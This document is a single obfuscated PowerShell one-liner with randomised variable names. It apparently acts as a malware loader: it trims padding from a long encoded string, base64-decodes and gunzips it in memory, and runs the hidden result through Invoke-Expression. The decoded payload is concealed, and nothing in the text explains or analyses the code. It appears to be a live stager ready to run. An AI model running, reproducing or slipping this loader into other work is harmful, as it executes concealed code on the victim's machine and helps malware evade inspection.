$ebc="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dn4yFVvlfINYtSm6KhgC2WXEBio+7";$8e1=[Convert]::FromBase64String($ebc.Substring(19,$ebc.Length-19-29));$23c=New-Object IO.MemoryStream(,$8e1);$08d=New-Object IO.Compression.GZipStream($23c,[IO.Compression.CompressionMode]::Decompress);$5d7=New-Object IO.StreamReader($08d);iex $5d7.ReadToEnd()